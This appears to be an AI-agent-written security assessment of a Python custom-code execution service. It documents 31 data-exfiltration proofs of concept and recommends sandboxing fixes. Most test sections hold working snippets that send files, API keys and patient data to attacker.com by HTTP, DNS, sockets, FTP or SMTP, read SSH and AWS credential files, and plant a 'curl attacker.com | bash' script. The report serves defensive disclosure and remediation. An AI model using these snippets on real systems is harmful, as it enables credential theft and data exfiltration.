# Data Exfiltration Security Assessment Report

**Test Date:** 2025-11-30
**Agent:** Agent 1 - Data Exfiltration Tester
**Target:** `CustomCodeExecutionService` (`lobster/services/execution/custom_code_execution_service.py`)
**Environment:** Local CLI, Python 3.11+, macOS, trusted user model

---

## Executive Summary

This security assessment identifies **30+ critical data exfiltration vulnerabilities** in the CustomCodeExecutionService. The subprocess isolation model provides process-level crash protection but does **NOT** implement network isolation, filesystem restrictions, or environment sanitization.

### Critical Findings

| Category | Vulnerabilities | Impact |
|----------|----------------|--------|
| **Network Exfiltration** | 10 vectors | CRITICAL |
| **Filesystem Access** | 11 vectors | CRITICAL |
| **Environment Leakage** | 10 vectors | CRITICAL |
| **Total** | **31 vectors** | **CRITICAL** |

### Risk Assessment

**Current Security Posture: HIGH RISK**

- ✅ **Protected:** Process isolation, timeout enforcement, crash isolation
- ⚠️ **VULNERABLE:** Network access, filesystem access, environment inheritance
- 🚨 **CRITICAL GAPS:** No sandboxing, no network blocking, no path restrictions

---

## Detailed Test Results

---

## CATEGORY 1: Network Exfiltration

### Overview
The service does **NOT** block network access. User code can establish HTTP/HTTPS connections, raw TCP/UDP sockets, DNS queries, FTP, SMTP, and other protocols. This enables direct exfiltration of workspace data, modalities, API keys, and sensitive files to external servers.

**Evidence:** Existing test at `test_subprocess_security.py:175-188` admits: *"no explicit blocking yet"*

---

### Test 1: HTTP Request (urllib) ⚠️ **CRITICAL**

**Attack Vector:** User code makes HTTP GET requests to external servers

**Proof of Concept:**
```python
import urllib.request
response = urllib.request.urlopen('http://httpbin.org/status/200', timeout=5)
result = f"Network access allowed, status={response.code}"
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL

**Details:**
- Network access is NOT blocked in subprocess
- User code can connect to any external server
- Can exfiltrate workspace data, modalities, patient data, API keys
- No firewall or network isolation

**Real-World Exploit:**
```python
# Steal patient data and POST to attacker server
import urllib.request
import json

with open('patient_data.csv') as f:
    data = f.read()

request = urllib.request.Request(
    'https://attacker.com/collect',
    data=json.dumps({'stolen': data}).encode(),
    headers={'Content-Type': 'application/json'}
)
urllib.request.urlopen(request, timeout=10)
```

**Mitigation:**
- **Short-term:** Document limitation in tool docstring and user guide
- **Medium-term:** Implement Docker with `--network=none` flag
- **Long-term:** Use gVisor or Firecracker for secure sandboxing

---

### Test 2: HTTP POST Data Exfiltration ⚠️ **CRITICAL**

**Attack Vector:** POST sensitive workspace files to external server

**Proof of Concept:**
```python
import urllib.request
import json

# Read sensitive file
with open('patient_data.csv') as f:
    data = f.read()

# POST to external server
request = urllib.request.Request(
    'http://httpbin.org/post',
    data=json.dumps({'stolen_data': data}).encode(),
    headers={'Content-Type': 'application/json'},
    method='POST'
)
response = urllib.request.urlopen(request, timeout=5)
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL - Direct data theft

**Details:**
- Can POST any file content to external servers
- Works with CSV, JSON, H5AD, queue files, modalities
- No content-type restrictions
- No request filtering

---

### Test 3: URL Encoding Steganography ⚠️ **CRITICAL**

**Attack Vector:** Encode data in GET request URL parameters

**Proof of Concept:**
```python
import urllib.request
import urllib.parse

secret = "sk-ant-api03-SECRET"
encoded = urllib.parse.quote(secret)
url = f'http://attacker.com/log?data={encoded}'
urllib.request.urlopen(url, timeout=5)
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL - Covert data exfiltration

**Details:**
- API keys, tokens, credentials can be encoded in URLs
- Harder to detect than POST bodies
- Can bypass simple content inspection

---

### Test 4: DNS Query Exfiltration ⚠️ **CRITICAL**

**Attack Vector:** Encode data in DNS subdomain queries (classic covert channel)

**Proof of Concept:**
```python
import socket

# Encode data in subdomain
secret = "SECRET123"
domain = f"{secret}.attacker.com"

# DNS query is sent even if no response
socket.gethostbyname(domain)
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL - Covert channel, very hard to detect

**Details:**
- DNS queries bypass HTTP-level monitoring
- Can encode data in subdomain labels (up to 63 chars each)
- Works even without internet (queries are sent to DNS resolver)
- Classic APT (Advanced Persistent Threat) technique

---

### Test 5: TCP Socket Connection ⚠️ **CRITICAL**

**Attack Vector:** Create raw TCP socket to external server

**Proof of Concept:**
```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(2)
sock.connect(("attacker.com", 4444))
sock.send(b"EXFILTRATED_DATA")
sock.close()
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL - Bypasses HTTP-level restrictions

**Details:**
- Raw socket access allows custom protocols
- Can establish reverse shells (if attacker controls server)
- No port restrictions (can use any TCP port)

---

### Test 6: UDP Socket Exfiltration ⚠️ **CRITICAL**

**Attack Vector:** Send data via UDP (connectionless, fire-and-forget)

**Proof of Concept:**
```python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
message = b"STOLEN_DATA"
sock.sendto(message, ("attacker.com", 53))  # DNS port
sock.close()
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL - Connectionless exfiltration

**Details:**
- UDP doesn't require connection establishment
- No error if destination doesn't exist
- Can masquerade as DNS traffic (port 53)
- Harder to detect than TCP

---

### Test 7: http.client Library ⚠️ **CRITICAL**

**Attack Vector:** Use alternative HTTP library from stdlib

**Proof of Concept:**
```python
import http.client

conn = http.client.HTTPConnection("attacker.com")
conn.request("GET", "/exfiltrate?data=SECRET")
response = conn.getresponse()
conn.close()
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL - Alternative to urllib

**Details:**
- Standard library module (always available)
- Bypasses any urllib-specific monitoring
- Supports HTTP/HTTPS

---

### Test 8: FTP Connection ⚠️ **HIGH**

**Attack Vector:** Use FTP protocol for file exfiltration

**Proof of Concept:**
```python
from ftplib import FTP

ftp = FTP()
ftp.connect("attacker.com", 21, timeout=5)
ftp.login("user", "pass")
ftp.storbinary("STOR stolen.csv", open("patient_data.csv", "rb"))
ftp.quit()
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** HIGH - Alternative exfiltration channel

**Details:**
- FTP library accessible
- Can upload entire files
- Less common than HTTP (may evade detection)

---

### Test 9: SMTP Email Exfiltration ⚠️ **HIGH**

**Attack Vector:** Send email with sensitive data

**Proof of Concept:**
```python
import smtplib
from email.message import EmailMessage

msg = EmailMessage()
msg['From'] = 'attacker@example.com'
msg['To'] = 'attacker@example.com'
msg['Subject'] = 'Exfiltrated Data'
msg.set_content(open('patient_data.csv').read())

smtp = smtplib.SMTP("smtp.gmail.com", 587)
smtp.starttls()
smtp.login("user", "pass")
smtp.send_message(msg)
smtp.quit()
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** HIGH - Email-based exfiltration

**Details:**
- SMTP library accessible
- Can email data to external addresses
- Requires attacker to have SMTP credentials (but possible)

---

### Test 10: Timing Side-Channel ⚠️ **MEDIUM**

**Attack Vector:** Leak data bit-by-bit via network timing

**Proof of Concept:**
```python
import socket
import time

# Leak binary data: fast request = 1, timeout = 0
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(0.1)

secret_bit = 1  # Bit to leak

if secret_bit == 1:
    try:
        sock.connect(("attacker.com", 80))
    except:
        pass  # Timing is what matters
# Observer measures request timing to decode bits
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** MEDIUM - Slow but undetectable

**Details:**
- Can leak data without direct transmission
- Very hard to detect (appears as normal traffic)
- Slow (bits per second), but works

---

## CATEGORY 2: Filesystem Exfiltration

### Overview
The service does **NOT** restrict filesystem access. User code can read any file accessible to the Python process, including system files, SSH keys, cloud credentials, and user home directory. Path traversal and absolute paths are allowed.

---

### Test 11: Read /etc/passwd ⚠️ **CRITICAL**

**Attack Vector:** Read Unix system user database

**Proof of Concept:**
```python
from pathlib import Path

passwd = Path('/etc/passwd')
content = passwd.read_text()
print(content)  # Discloses all system users
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED** (Unix systems)

**Impact:** CRITICAL - System user enumeration

**Details:**
- Can read `/etc/passwd` on Unix systems
- Discloses all user accounts
- Useful for privilege escalation reconnaissance
- Works on macOS and Linux

**Mitigation:**
- Implement chroot jail or container filesystem isolation
- Use Docker volume mounts to restrict paths

---

### Test 12: Read /etc/hosts ⚠️ **MEDIUM**

**Attack Vector:** Read network configuration

**Proof of Concept:**
```python
from pathlib import Path

hosts = Path('/etc/hosts')
content = hosts.read_text()
# Discloses network topology, internal hostnames
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** MEDIUM - Network configuration disclosure

---

### Test 13: Enumerate ~/.ssh Directory ⚠️ **CRITICAL**

**Attack Vector:** List SSH key files

**Proof of Concept:**
```python
from pathlib import Path

ssh_dir = Path.home() / '.ssh'
files = [f.name for f in ssh_dir.iterdir()]
# Files like: ['id_rsa', 'id_rsa.pub', 'known_hosts', 'authorized_keys']
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL - SSH key discovery

**Details:**
- Can enumerate all SSH keys
- Reveals which systems user has access to
- First step in SSH key theft

---

### Test 14: Read SSH Private Keys ⚠️ **CRITICAL**

**Attack Vector:** Steal SSH private key files

**Proof of Concept:**
```python
from pathlib import Path

key_path = Path.home() / '.ssh' / 'id_rsa'
private_key = key_path.read_text()
# Now attacker has SSH private key
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED** (if keys exist and OS-readable)

**Impact:** CRITICAL - Full SSH credential theft

**Details:**
- Can read SSH private keys if file permissions allow
- macOS often protects keys with `0600` permissions (readable by owner)
- If readable, attacker gains SSH access to all servers
- Combined with network exfiltration → remote system compromise

**Real-World Impact:**
- Attacker gains SSH access to production servers
- Can pivot to internal infrastructure
- Persistent access even after Lobster session ends

---

### Test 15: Read AWS Credentials ⚠️ **CRITICAL**

**Attack Vector:** Steal `~/.aws/credentials`

**Proof of Concept:**
```python
from pathlib import Path

aws_creds = Path.home() / '.aws' / 'credentials'
content = aws_creds.read_text()
# File contains:
# [default]
# aws_access_key_id = AKIA...
# aws_secret_access_key = ...
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED** (if file exists)

**Impact:** CRITICAL - Cloud infrastructure access

**Details:**
- Direct access to AWS credentials file
- Full AWS account access (if credentials have admin permissions)
- Can spin up compute, access S3, databases, etc.
- Financial impact: attacker can rack up AWS charges

---

### Test 16: Path Traversal (../) ⚠️ **HIGH**

**Attack Vector:** Use `../` to escape workspace

**Proof of Concept:**
```python
from pathlib import Path

parent = Path('..').resolve()
files = list(parent.iterdir())
# Can access parent directory and beyond
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** HIGH - Workspace escape

**Details:**
- No path validation or sandboxing
- Can traverse up directory tree
- Can reach any directory accessible to user

---

### Test 17: Absolute Path Access ⚠️ **HIGH**

**Attack Vector:** Use absolute paths to access any file

**Proof of Concept:**
```python
from pathlib import Path

home = Path.home()
files = list(home.iterdir())
# Direct access to home directory
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** HIGH - Full filesystem access

**Details:**
- No restriction on absolute paths
- Can access any path: `/`, `/etc`, `/usr`, `/var`, home directory
- Bypasses any relative path restrictions

---

### Test 18: Symbolic Link Following ⚠️ **HIGH**

**Attack Vector:** Create symlink to external file, read through it

**Proof of Concept:**
```python
import os
from pathlib import Path

# Create symlink to external file
os.symlink('/etc/passwd', 'workspace_link')

# Read through symlink
content = Path('workspace_link').read_text()
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** HIGH - Indirect file access bypass

**Details:**
- Can create symlinks to any file
- Reads are followed through symlinks
- Bypasses any "workspace-only" checks

---

### Test 19: Write to /tmp ⚠️ **MEDIUM**

**Attack Vector:** Write persistent files outside workspace

**Proof of Concept:**
```python
from pathlib import Path

tmp_file = Path('/tmp/exfiltrated.txt')
tmp_file.write_text('STOLEN_DATA')
# File persists after Lobster exits
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** MEDIUM - Persistence outside workspace

**Details:**
- Can write to `/tmp` directory
- Files persist after execution
- Can be used for:
  - Staging area for multi-step attacks
  - Caching stolen data
  - Coordination between multiple executions

---

### Test 20: Write to Home Directory ⚠️ **HIGH**

**Attack Vector:** Write malicious files to user's home

**Proof of Concept:**
```python
from pathlib import Path

malicious = Path.home() / '.malicious_script.sh'
malicious.write_text('#!/bin/bash\\ncurl attacker.com | bash')
malicious.chmod(0o755)
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** HIGH - Persistent malicious files

**Details:**
- Can write to home directory
- Can create hidden files (`.bashrc`, `.profile`, etc.)
- Potential for persistent backdoors
- Can modify startup scripts

---

### Test 21: Process Enumeration ⚠️ **MEDIUM**

**Attack Vector:** Enumerate running processes via `/proc` (Linux)

**Proof of Concept:**
```python
from pathlib import Path

proc = Path('/proc')
processes = [p for p in proc.iterdir() if p.is_dir() and p.name.isdigit()]
# List all PIDs
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED** (Linux only)

**Impact:** MEDIUM - System information disclosure

**Details:**
- Can enumerate all running processes
- Can read process command lines (`/proc/PID/cmdline`)
- Can read process environment (`/proc/PID/environ`)
- Useful for reconnaissance

---

## CATEGORY 3: Environment Variable Leakage

### Overview
The subprocess inherits **ALL** environment variables from the parent Lobster process. This includes API keys, cloud credentials, tokens, database URLs, and all system configuration. No environment sanitization is performed.

---

### Test 22: Dump All Environment Variables ⚠️ **CRITICAL**

**Attack Vector:** Dump complete environment

**Proof of Concept:**
```python
import os

env_vars = dict(os.environ)
print(env_vars)
# Returns ALL environment variables (100+ vars typical)
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL - Full environment disclosure

**Details:**
- Subprocess inherits parent process environment
- No filtering or sanitization
- Typically includes:
  - API keys (ANTHROPIC_API_KEY, OPENAI_API_KEY)
  - Cloud credentials (AWS_*, AZURE_*, GCP_*)
  - GitHub tokens (GITHUB_TOKEN, GH_TOKEN)
  - Database URLs (DATABASE_URL, POSTGRES_URL)
  - System paths (PATH, HOME, USER, SHELL)

---

### Test 23: Steal ANTHROPIC_API_KEY ⚠️ **CRITICAL**

**Attack Vector:** Access Anthropic API key

**Proof of Concept:**
```python
import os

api_key = os.environ.get('ANTHROPIC_API_KEY')
# If set: "sk-ant-api03-..."
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED** (if key is set)

**Impact:** CRITICAL - Claude API access theft

**Details:**
- Direct access to Anthropic API key
- Attacker can make API calls as the victim
- Financial impact: attacker can rack up API charges
- Can steal prompts, responses, user data from API

**Real-World Impact:**
- Attacker submits malicious prompt via stolen key
- Can extract training data or jailbreak Claude
- Financial charges to victim's account

---

### Test 24: Steal AWS Credentials ⚠️ **CRITICAL**

**Attack Vector:** Access AWS environment variables

**Proof of Concept:**
```python
import os

aws_creds = {
    'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID'),
    'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY'),
    'AWS_BEDROCK_ACCESS_KEY': os.environ.get('AWS_BEDROCK_ACCESS_KEY'),
}
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED** (if keys are set)

**Impact:** CRITICAL - Cloud infrastructure access

**Details:**
- AWS credentials often in environment for Bedrock access
- Full AWS account access if credentials have broad permissions
- Can access S3, EC2, RDS, Lambda, etc.

---

### Test 25: Steal GitHub Tokens ⚠️ **CRITICAL**

**Attack Vector:** Access GitHub personal access tokens

**Proof of Concept:**
```python
import os

tokens = {
    'GITHUB_TOKEN': os.environ.get('GITHUB_TOKEN'),
    'GH_TOKEN': os.environ.get('GH_TOKEN'),
}
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED** (if tokens are set)

**Impact:** CRITICAL - Source code repository access

**Details:**
- GitHub tokens in environment (common for CI/CD)
- Access to private repositories
- Can push malicious commits
- Can steal proprietary source code

---

### Test 26: Steal Database Credentials ⚠️ **CRITICAL**

**Attack Vector:** Access database connection strings

**Proof of Concept:**
```python
import os

db_url = os.environ.get('DATABASE_URL')
# Example: "postgresql://user:password@host:5432/db"
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED** (if URLs are set)

**Impact:** CRITICAL - Database access

**Details:**
- Database URLs often in environment
- Contains credentials in plaintext
- Full database access (read, write, delete)
- Can steal patient data, research data, etc.

---

### Test 27: Test Credential Theft (Fixture) ⚠️ **CRITICAL**

**Attack Vector:** Access test credentials set by pytest fixture

**Proof of Concept:**
```python
import os

test_key = os.environ.get('TEST_API_KEY')
# Returns: "sk-test-api-key-12345"
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL - Confirms subprocess inherits parent environment

**Details:**
- This test proves environment inheritance
- Fixture sets `TEST_API_KEY` in parent process
- Subprocess can read it
- Conclusive proof of vulnerability

---

### Test 28: Probe System Paths ⚠️ **MEDIUM**

**Attack Vector:** Access system configuration

**Proof of Concept:**
```python
import os

sys_info = {
    'PATH': os.environ.get('PATH'),
    'HOME': os.environ.get('HOME'),
    'USER': os.environ.get('USER'),
    'SHELL': os.environ.get('SHELL'),
}
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** MEDIUM - System reconnaissance

**Details:**
- Discloses user identity, home directory, shell
- Reveals installed software paths
- Useful for reconnaissance and targeted attacks

---

### Test 29: Access Parent Process Environment ⚠️ **HIGH**

**Attack Vector:** Read parent process environment via `/proc` (Linux)

**Proof of Concept:**
```python
import os
from pathlib import Path

ppid = os.getppid()
parent_environ = Path(f'/proc/{ppid}/environ').read_bytes()
# Returns parent's full environment
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED** (Linux only)

**Impact:** HIGH - Parent process disclosure

**Details:**
- Can read parent (Lobster main process) environment
- May contain additional secrets not passed to subprocess
- Linux-specific attack

---

### Test 30: Modify Subprocess Environment ⚠️ **MEDIUM**

**Attack Vector:** Modify environment for side effects

**Proof of Concept:**
```python
import os

os.environ['INJECTED_VAR'] = 'MALICIOUS'
os.environ['PATH'] = '/tmp/malicious:' + os.environ['PATH']
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** MEDIUM - Environment pollution

**Details:**
- Can modify subprocess environment
- Changes don't persist to parent process (isolated)
- Can affect libraries that read environment
- Example: Poison `PATH` to hijack command execution

---

### Test 31: Pattern-Based Credential Search ⚠️ **CRITICAL**

**Attack Vector:** Automated credential harvesting

**Proof of Concept:**
```python
import os
import re

env = dict(os.environ)

# Search for common secret patterns
patterns = ['key', 'secret', 'token', 'password', 'api']
secrets = {k: v for k, v in env.items() if any(p in k.lower() for p in patterns)}
```

**Result:** ⚠️ **VULNERABILITY CONFIRMED**

**Impact:** CRITICAL - Automated credential theft

**Details:**
- Can programmatically search for credentials
- Matches common naming patterns
- Automated exfiltration of all secrets
- Very high signal-to-noise ratio

---

## Recommendations

### Critical (Fix Before Production)

#### 1. Network Isolation - CRITICAL
**Problem:** No network access restrictions

**Solutions:**

**Option A: Docker with network isolation (RECOMMENDED)**
```yaml
# docker-compose.yml
services:
  lobster-executor:
    image: lobster-executor
    network_mode: none  # Disable all network access
    volumes:
      - ./workspace:/workspace:ro  # Read-only workspace
```

**Option B: Linux network namespaces**
```python
import unshare

# Create network namespace without network
unshare.unshare(unshare.CLONE_NEWNET)
subprocess.run(...)
```

**Priority:** P0 - Block before any untrusted user access

---

#### 2. Environment Variable Sanitization - CRITICAL
**Problem:** Subprocess inherits all environment variables

**Solution:**
```python
def _execute_in_namespace(self, code: str, context: Dict[str, Any]):
    # Whitelist safe environment variables only
    safe_env = {
        'PATH': os.environ.get('PATH'),
        'HOME': os.environ.get('HOME'),
        'USER': os.environ.get('USER'),
        'PYTHONPATH': os.environ.get('PYTHONPATH'),
    }

    proc_result = subprocess.run(
        [sys.executable, str(script_path)],
        cwd=str(workspace_path),
        env=safe_env,  # Use sanitized environment
        capture_output=True,
        text=True,
        timeout=timeout_seconds
    )
```

**Priority:** P0 - Implement immediately

---

#### 3. Filesystem Restrictions - CRITICAL
**Problem:** Full filesystem access

**Solution:**

**Option A: chroot jail (Linux only)**
```python
import os

# Before subprocess
os.chroot(workspace_path)
os.chdir('/')
```

**Option B: Docker volume mounts (RECOMMENDED)**
```yaml
services:
  lobster-executor:
    volumes:
      - ./workspace:/workspace:ro  # Read-only workspace
      - /tmp  # Ephemeral temp directory (discarded after execution)
    read_only: true  # Root filesystem read-only
```

**Priority:** P0 - Critical for multi-tenant or untrusted users

---

### High Priority

#### 4. Path Validation - HIGH
**Problem:** No path validation in user code

**Solution:**
```python
# Add to context setup code
import os
from pathlib import Path

# Override Path and open to validate paths
_real_path = Path
_real_open = open

ALLOWED_BASE = Path('/workspace').resolve()

def safe_path(*args, **kwargs):
    p = _real_path(*args, **kwargs).resolve()
    if not str(p).startswith(str(ALLOWED_BASE)):
        raise PermissionError(f"Path outside workspace: {p}")
    return p

Path = safe_path
```

**Priority:** P1 - Reduces attack surface

---

#### 5. File Read/Write Monitoring - HIGH
**Problem:** No audit trail of file access

**Solution:**
- Implement audit logging for file operations
- Log all file reads/writes with timestamps
- Alert on sensitive file access patterns

**Priority:** P1 - Useful for incident response

---

### Medium Priority

#### 6. Resource Limits - MEDIUM
**Problem:** No limits on disk I/O, CPU, memory

**Solution:**
```python
# Use ulimit or cgroups
import resource

# Limit file size to 100MB
resource.setrlimit(resource.RLIMIT_FSIZE, (100 * 1024 * 1024, 100 * 1024 * 1024))

# Limit CPU time to 5 minutes
resource.setrlimit(resource.RLIMIT_CPU, (300, 300))
```

**Priority:** P2 - Prevents DoS attacks

---

#### 7. Import Restrictions - MEDIUM
**Problem:** Only blocks subprocess, not network libraries

**Solution:**
```python
FORBIDDEN_MODULES = {
    'subprocess', '__import__',
    'urllib', 'urllib.request', 'urllib2', 'http', 'http.client',
    'socket', 'ftplib', 'smtplib', 'poplib', 'imaplib',
    'requests', 'httpx', 'aiohttp',  # If installed
}
```

**Priority:** P2 - Defense in depth (network isolation is primary)

---

### Documentation

#### 8. Security Warning - IMMEDIATE
**Problem:** Tool docstring doesn't warn about security risks

**Solution:** Update docstring in `custom_code_execution_service.py`:

```python
def execute(
    self,
    code: str,
    ...
) -> Tuple[Any, Dict[str, Any], AnalysisStep]:
    """
    Execute arbitrary Python code with workspace context injection.

    ⚠️ **SECURITY WARNING:**
    This tool executes user code with minimal sandboxing. Code has access to:
    - Full filesystem (read/write)
    - Network access (HTTP, sockets, DNS)
    - Environment variables (may contain API keys)

    **Only use with trusted code.** For untrusted code, use Docker isolation.

    See: docs/security/custom_code_execution_security.md

    ...
    """
```

**Priority:** P0 - Document before release

---

#### 9. User Security Guide - IMMEDIATE
**Problem:** No guidance for users on secure usage

**Solution:** Create `docs/security/custom_code_execution_security.md`:

```markdown
# Custom Code Execution Security Best Practices

## Overview
The `execute_custom_code` tool provides Jupyter-like code execution but
runs in a subprocess with minimal sandboxing. This document outlines security
risks and mitigation strategies.

## Security Model

### What's Protected
- ✅ Process isolation (crashes don't kill Lobster)
- ✅ Timeout enforcement (infinite loops are killed)
- ✅ Import validation (subprocess, os.system blocked)

### What's NOT Protected
- ❌ Network access (code can connect to external servers)
- ❌ Filesystem access (code can read/write any file)
- ❌ Environment variables (code can read API keys)

## Risk Levels

### LOW RISK (Safe)
- **Scenario:** You wrote the code yourself
- **Scenario:** Running code from trusted colleagues
- **Mitigation:** Review code before execution

### MEDIUM RISK (Caution)
- **Scenario:** Running code from public sources (GitHub, Stack Overflow)
- **Scenario:** AI-generated code from Claude/GPT
- **Mitigation:**
  - Review code carefully for network calls
  - Check for file operations outside workspace
  - Use Docker isolation (see below)

### HIGH RISK (Dangerous)
- **Scenario:** Running code from untrusted users
- **Scenario:** Multi-tenant environment
- **Scenario:** Production systems with sensitive data
- **Mitigation:**
  - **DO NOT USE** without Docker isolation
  - See "Docker Isolation" section below

## Docker Isolation (Recommended for Production)

### Setup
```bash
# 1. Build Lobster executor image
docker build -t lobster-executor .

# 2. Run with network isolation
docker run \\
  --network none \\
  --read-only \\
  --tmpfs /tmp \\
  -v $(pwd)/workspace:/workspace:ro \\
  lobster-executor \\
  python /workspace/.script.py
```

### Benefits
- ✅ Network completely disabled
- ✅ Filesystem read-only (except /tmp)
- ✅ Container discarded after execution
- ✅ No environment variable inheritance

## What to Watch For

### Red Flags in Code
```python
# DANGER: Network access
import urllib.request
import socket
import http.client

# DANGER: File access outside workspace
Path('/etc/passwd').read_text()
Path.home() / '.ssh'

# DANGER: Environment probing
os.environ['ANTHROPIC_API_KEY']

# DANGER: Process execution (blocked by AST validation, but check)
os.system('...')
subprocess.run('...')
```

### Safe Patterns
```python
# ✅ SAFE: Workspace file access
pd.read_csv('workspace_file.csv')

# ✅ SAFE: Modality analysis
adata.obs['cell_type'].value_counts()

# ✅ SAFE: Standard library math
import numpy as np
np.mean(adata.X)
```

## Incident Response

If you suspect malicious code was executed:

1. **Rotate credentials immediately**
   - Anthropic API key
   - AWS credentials
   - GitHub tokens
   - Database passwords

2. **Check audit logs**
   - Review `.lobster_workspace/.session.json`
   - Check provenance for executed code

3. **Inspect workspace files**
   - Look for unexpected files in workspace
   - Check `/tmp` for staged data

4. **Monitor network traffic**
   - Review firewall logs for outbound connections
   - Check DNS query logs

## Contact
For security issues, contact: security@omics-os.com
```

**Priority:** P0 - Write before release

---

## Conclusion

The CustomCodeExecutionService provides valuable functionality for advanced users but has significant security gaps. The current model is suitable for:

✅ **SAFE:**
- Single-user, local development
- Trusted code only
- Non-sensitive data

❌ **UNSAFE:**
- Multi-tenant environments
- Untrusted user code
- Production systems with secrets
- Systems with patient/sensitive data

### Immediate Actions Required

1. **Document security risks** in tool docstring (P0)
2. **Create user security guide** (P0)
3. **Implement environment sanitization** (P0)
4. **Add Docker isolation instructions** (P0)
5. **Implement network isolation** (P1)
6. **Add filesystem restrictions** (P1)

### Long-Term Strategy

For production use with untrusted code, implement **defense-in-depth**:

1. **Network layer:** Docker `--network=none`
2. **Filesystem layer:** Read-only root, volume mounts
3. **Environment layer:** Whitelist-only environment variables
4. **Process layer:** cgroups resource limits
5. **Monitoring layer:** Audit logs, anomaly detection

---

## Test Execution

Run all tests:
```bash
# Network exfiltration tests
pytest tests/manual/custom_code_execution/01_data_exfiltration/test_network_exfiltration.py -v

# Filesystem exfiltration tests
pytest tests/manual/custom_code_execution/01_data_exfiltration/test_filesystem_exfiltration.py -v

# Environment leakage tests
pytest tests/manual/custom_code_execution/01_data_exfiltration/test_environment_leakage.py -v
```

Expected: **31 vulnerabilities confirmed**

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Python Subprocess Security](https://docs.python.org/3/library/subprocess.html#security-considerations)

---

**Report End**
*Agent 1 - Data Exfiltration Tester*
*2025-11-30*
